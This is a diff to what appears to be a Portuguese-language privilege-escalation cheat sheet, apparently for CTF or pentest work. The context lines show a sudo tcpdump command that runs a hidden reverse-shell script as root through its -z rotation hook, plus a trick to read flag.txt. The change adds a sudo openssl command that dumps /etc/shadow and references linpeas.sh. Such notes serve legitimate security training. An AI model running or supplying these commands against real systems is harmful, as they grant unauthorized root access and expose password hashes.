@@ -188,9 +188,11 @@ uid=0(root) gid=0(root) groups=0(root)
 3- mapfile -t a < flag.txt
    printf "%s\n" "${a[@]}"
 
-# Caso o bin tcpdump seja (root) NOPASSWD: /usr/sbin/tcpdump
+# Caso o bin /usr/sbin/tcpdump seja (root) NOPASSWD: /usr/sbin/tcpdump
 sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.arquivo_com_shell_reversa -Z root
 
+# Caso o bin /usr/bin/openssl seja (root) NOPASSWD para ler arquivos com permissões root
+sudo /usr/bin/openssl enc -in /etc/shadow
 
 # Ferramentas automatizadas de enumeração
 linpeas.sh
